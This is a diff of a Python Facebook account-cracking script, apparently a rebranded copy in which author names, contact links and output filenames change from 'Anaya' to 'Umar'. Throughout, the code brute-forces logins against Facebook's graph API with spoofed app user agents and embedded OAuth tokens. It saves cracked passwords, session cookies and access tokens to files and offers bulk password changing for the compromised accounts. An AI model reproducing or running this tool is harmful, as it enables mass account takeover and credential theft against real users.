@@ -46,22 +46,24 @@ ses = requests.Session()
 def logo():
 	os.system('clear')
 	logo = ("""\33[;33m            
-\033[92m                                                                                                                                                     
- d888b8b    88bd88b  d888b8b  ?88   d8P  d888b8b  
-d8P' ?88    88P' ?8bd8P' ?88  d88   88  d8P' ?88  
-88b  ,88b  d88   88P88b  ,88b ?8(  d88  88b  ,88b 
-`?88P'`88bd88'   88b`?88P'`88b`?88P'?8b `?88P'`88b
-                                     )88          
-     𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂                ,d8P          
-                                 `?888P'                                                
-[<>] The Original Codes are 𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂  \033[1;97m
+\033[92m
+   
+ ...    :::.        :    :::.    :::::::..   
+ ;;     ;;;;;,.    ;;;   ;;`;;   ;;;;``;;;;  
+[['     [[[[[[[, ,[[[[, ,[[ '[[,  [[[,/[[['  
+$$      $$$$$$$$$$$"$$$c$$$cc$$$c $$$$$$c    
+88    .d888888 Y88" 888o888   888,888b "88bo,
+ "YmmMMMM""MMM  M'  "MMMYMM   ""` MMMM   "W" 
+                                      
+[<>] The Original Codes are Written by Umar Nazeer 
 ---------------------------------------------------
- ╰◈▪➣ Author    : ★彡[𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂]彡★ 
- ╰◈▪➣ Version   : Version [10.4]
- ╰◈▪➣ Cloning   : New Idz
- ╰◈▪➣ Sires     : 61554, 61555 
+ ╰◈▪➣ Github    : https://github.com/CyberAttack 
+ ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
+ ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
+ ╰◈▪➣ Version   : Version [10.5]
+ ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
 -------------------------------------------------- 
-""")  
+\033[1;97m""")  
 	p(logo)
 def clear():
 	os.system("clear")
@@ -87,13 +89,9 @@ def connection_token():
 	 # convert list to string
 	 final_string = ''.join(sample_list)
 	 return final_string
-locales = f"{random.choice(['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
-        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
-        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
-        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA'])}"
- 
+
 #method1
-yahe ="[FBAN/FB4A;FBAV/342.1.0.14.119;FBBV/339015010[FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/339015010;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1:;]","[FBAN/FB4A;FBAV/343.0.0.8.474;FBBV/344064182[FBAN/Orca-Android;FBAV/343.0.0.8.474;FBPN/com.facebook.orca;FBLC/en_US;FBBV/344064182;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1:;]"
+yahe ="[FBAN/Orca-Android;FBAV/319.0.0.22.170;FBBV/301916794;FBDM/{density=1.75,width=720,height=1411};FBLC/pt_BR;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A115M;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/364.0.0.10.112;FBBV/374667243;FBDM/{density=1.3312501,width=1280,height=736};FBLC/en_US;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T290;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/66.0.3774.127;FBBV/854283466;FBDM/{density=2.25,height=1024,width=2048};FBLC/en_US;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-J250F;FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]"
 
 
 def uaa():
@@ -122,6 +120,11 @@ def uaa():
     return user_agent
 
 
+def baba():
+    start = f'[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(111111,9999999)};'
+    end = '[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/PCAT00;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;;]'
+    ua = start + end
+    return ua
 
 
 nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
@@ -149,8 +152,8 @@ class iAmMain:
 		elif opt1 == "2":self.num_menu()
 		elif opt1 == "4":automation().menu()
 		elif opt1 == "3":Grep().links_only()
-		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7')
-		elif opt1 == "A":os.system("xdg-open https://wa.me/+923096902140")
+		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
+		elif opt1 == "A":os.system("xdg-open https://wa.me/+923021431324")
 	  
 	
 	def dump_menu(self):
@@ -158,7 +161,7 @@ class iAmMain:
 		
 	def file_menu(self):
 		logo()
-		p(" 📁 : Example /sdcard/Anaya.txt")
+		p(" 📁 : Example /sdcard/Umar.txt")
 		file = input(" 📁 : Put File Path : ")
 		try:
 			id = open(file,"r").read().splitlines()
@@ -299,7 +302,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [Umar] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -374,7 +377,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r Anaya %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r Umar %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -397,19 +400,19 @@ class iAmMain:
 "meta_inf_fbmeta": "NO_FILE",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
+"locale": "en_PK",
+"client_country_code": "PK",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-				headers = {'User-Agent': uaa(),
+				headers = {'User-Agent': baba(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(30000, 40000)),
 'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
 'X-FB-Connection-Type': f'{SEX}',
-'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
 'X-FB-Connection-Quality':f'{SEX}',
 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 'X-Tigon-Is-Retry': 'False',
@@ -427,16 +430,16 @@ class iAmMain:
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					open('/sdcard/Anaya_M2_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -448,7 +451,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -501,15 +504,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_M3_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M3_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M3_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -521,7 +524,7 @@ class iAmMain:
 	def method4(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -558,15 +561,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_M4_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M4_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -578,7 +581,7 @@ class iAmMain:
 	def r_crack(self,uid,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			for pw in pwx:
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
@@ -626,15 +629,15 @@ class iAmMain:
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/UMAR_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -646,12 +649,12 @@ class iAmMain:
 class Join:
 	def __init_(self):
 		logo()
-		os.system("xdg-open https://wa.me/+923096902140")
+		os.system("xdg-open https://wa.me/+923021431324")
 	def Whatsapp(self):
 		os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
 		iAmMain().iAmMenu()
 	def Facebook(self):
-		#os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
+		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
 		iAmMain().iAmMenu()
 
 class Grep:
@@ -662,7 +665,7 @@ class Grep:
 		file = input(" [✓] File Path :- ")
 		try:
 			open(file,'r').read()
-			print("	[✓]	Example  /sdcard/Anaya.txt   ")
+			print("	[✓]	Example  /sdcard/Umar.txt   ")
 			out = input("  [=] Save Path :- ")
 			os.system('touch '+out)
 			os.system('sort -r '+file+' | uniq > '+out)
@@ -681,7 +684,7 @@ class Grep:
 			p(" [  Example  :-  /sdcard/file.txt  ] ")
 			file = input(" [•|•] Enter File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/Anaya.txt   ")
+			p("	Example  :-  /sdcard/Umar.txt   ")
 			sav = input(" [✓] Enter Save Path :- ")
 			line()
 			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
@@ -718,7 +721,7 @@ class Grep:
 			line()
 			file = input(" [✓] File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/Anaya.txt 	")
+			p("	Example  :-  /sdcard/Umar.txt 	")
 			ofile= input(" [✓] File Save Path :- ")
 			line()
 			try:
@@ -799,7 +802,7 @@ class automation:
 		p(" [•] File Splitted Complete")
 	def iAmPasswordManager(self):
 		logo()
-		p(" [•] Password Changer By : Anaya")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
 		line()
@@ -821,9 +824,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya@@@"
+			iamdefaultpassword = "UMAR@@@"
 		logo()
-		p(" [•] Password Changer By : Anaya")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -893,9 +896,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya"
+			iamdefaultpassword = "UMAR"
 		logo()
-		p(" [•] Password Changer By : Anaya ")
+		p(" [•] Password Changer By : UMAR ")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -956,7 +959,7 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya786"
+			iamdefaultpassword = "UMAR786"
 		p(" [•] Default Password : %s"%(iamdefaultpassword))
 		line()
 		os.system("rm -rf .default_password.txt ")
@@ -979,12 +982,12 @@ def shoha_menu():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/Anaya0309/Anaya/blob/main/Paid.txt").text
+    DARK=requests.get("https://github.com/GitHub6G/Git-Hub/blob/main/Approval.txt").text
     if id in DARK:
         'main()'
     else:
         os.system("clear")
-        os.system("xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7")
+        os.system("xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf")
         time.sleep(3.0)
         
         os.system("clear")
@@ -1009,7 +1012,7 @@ def shoha_menu():
         name = input(" Your Name : ")
         print ("")
         input(" Press Enter To Send Key")
-        os.system("xdg-open https://wa.me/+923096902140")
+        os.system("xdg-open https://wa.me/+923021431324")
         shoha_menu()
 
 shoha_menu()
